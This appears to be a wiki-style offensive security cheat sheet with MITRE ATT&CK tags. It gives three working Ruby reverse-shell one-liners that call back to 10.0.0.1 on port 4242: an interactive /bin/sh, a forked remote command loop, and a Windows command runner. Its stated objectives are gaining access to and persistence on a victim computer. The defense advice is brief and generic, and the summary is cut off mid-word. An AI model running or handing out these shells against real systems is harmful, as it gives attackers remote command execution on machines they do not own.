---
id: e0a51d13-4736-4fbb-bbb2-d77c3afeeb98
name: Ruby Reverse Shell Cheat Sheet
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.317992+00:00'
updated_at: '2023-04-10T20:25:24.543744+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Scripting|T1064 - Scripting]]'
tags:
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
- '[[Ruby]]'
commands:
- '[[Interactive shell]]'
- '[[Remote command execution]]'
- '[[Remote command execution (Windows)]]'
---

# Ruby Reverse Shell Cheat Sheet

## Summary

A reverse shell is a type of shell where the victim computer calls back to an attacker's computer. This cheat sheet will provide a Ruby Reverse Shell. A reverse shell can be used to bypass firewalls and other network security measures. A reverse shell can also be used for persistence, allowing atta

## Description

# Description

A reverse shell is a type of shell where the victim computer calls back to an attacker's computer. This cheat sheet will provide a Ruby Reverse Shell. A reverse shell can be used to bypass firewalls and other network security measures. A reverse shell can also be used for persistence, allowing attackers to maintain access to a system even after being disconnected. The Ruby Reverse Shell uses a simple TCP connection to establish a connection between the attacker and victim computer.

 

## Requirements

1. Victim computer must have Ruby installed

1. Attacker must have network access to the victim computer

 

## Defense

1. Implement network segmentation to limit access to critical systems

1. Monitor network traffic for suspicious activity

1. Use strong authentication mechanisms to prevent unauthorized access

 

## Objectives

1. Establish a reverse shell connection with a victim computer

1. Maintain persistence on the victim computer

 

# Instructions

1. This command provides a Ruby-based reverse shell. It allows an attacker to gain access to a remote system and execute commands on it. The command opens a socket connection to the specified IP address and port number. Once a connection is established, the attacker can execute commands on the remote system. The first command opens an interactive shell, while the second command allows the attacker to execute multiple commands. The third command is for Windows systems only and allows the attacker to execute commands remotely.

 



**Code**: [[ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242)]]



> The 'ruby -rsocket' command loads the socket library in Ruby. The first command creates a socket connection to the specified IP address and port number. It then opens an interactive shell on the remote system. The second command creates a socket connection to the specified IP address and port number. It then allows the attacker to execute multiple commands on the remote system. The third command is for Windows systems only and allows the attacker to execute commands remotely. The 'while' loop listens for commands from the attacker and executes them on the remote system using 'IO.popen'.



**Command** ([[Interactive shell]]):

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```





**Command** ([[Remote command execution]]):

```bash
ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```





**Command** ([[Remote command execution (Windows)]]):

```bash
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Scripting|T1064 - Scripting]]

## Commands Used

- [[Interactive shell]]
- [[Remote command execution]]
- [[Remote command execution (Windows)]]

## Tags

- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
- [[Ruby]]


